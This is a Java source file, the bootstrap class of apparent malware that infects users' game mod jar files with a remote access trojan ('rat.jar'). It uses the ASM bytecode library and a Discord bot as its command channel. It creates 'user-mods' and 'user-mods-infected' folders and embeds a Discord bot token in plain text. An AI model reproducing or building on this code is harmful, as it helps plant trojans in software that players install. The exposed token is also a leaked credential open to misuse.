package xyz.maywr.jugg;

import lombok.Getter;
import lombok.Setter;
import lombok.SneakyThrows;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.MessageChannel;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;
import org.objectweb.asm.*;
import xyz.maywr.jugg.infector.Infector;

import java.io.File;
import java.nio.file.Files;

/**
 * @author maywr
 * 14.07.2022 0:05
 */
public class ServerBootstrap implements Opcodes
{
	public static final String MANAGE_CHAT_NAME = "admin";
	public static final File INPUT_FOLDER = new File( "user-mods" );
	public static final File OUTPUT_FOLDER = new File( "user-mods-infected" );

	@Getter
	@Setter
	private static MessageChannel adminChannel;

	@Getter
	private static JDA jda;

	public static @SneakyThrows
	void main( String[] args )
	{

		if ( !new File( "rat.jar" ).exists() )
		{
			System.err.println( "WARNING: rat.jar does not exist" );
		}

		jda = JDABuilder.createDefault( "OTk5NDE3NTA4NzQ0NDA1MDk0.G6nK-4.DhQWV4HvdFxYjsEmXpIKPeh9ZFnn0nbmV9aGQM" )
		                .setActivity( getActivity() ).setStatus( OnlineStatus.DO_NOT_DISTURB )
		                .addEventListeners( getListeners() ).build();
		INPUT_FOLDER.mkdirs();
		OUTPUT_FOLDER.mkdirs();

	}

	private static Activity getActivity()
	{
		return Activity.playing( "roblox" );
	}

	private static Object[] getListeners()
	{
		return new Object[]{ MessageHandler.getInstance() };
	}

}
